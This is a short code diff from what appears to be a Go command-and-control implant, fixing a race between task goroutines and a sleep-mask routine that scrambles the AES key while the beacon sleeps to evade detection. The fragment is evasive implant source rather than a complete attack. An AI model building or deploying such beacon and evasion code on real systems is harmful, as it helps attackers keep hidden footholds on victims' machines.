@@ -176,15 +176,17 @@ func Run(t transport) {
 			}
 		} else {
 			state.ok()
+			var wg sync.WaitGroup
 			for _, task := range tasks {
-				go dispatchTask(t, task)
+				wg.Add(1)
+				go func(task taskWire) {
+					defer wg.Done()
+					dispatchTask(t, task)
+				}(task)
 			}
+			wg.Wait() // must complete before sleep mask scrambles the AES key
 		}
 		d := state.next()
-		// Use sleep masking to hide during the beacon sleep interval.
-		// "none" skips masking entirely; used when task goroutines must
-		// call sendResult concurrently (sleep mask scrambles the AES key
-		// in-place, racing with any in-flight seal/open calls).
 		switch SleepMaskMode {
 		case "none", "off", "plain":
 			time.Sleep(d)
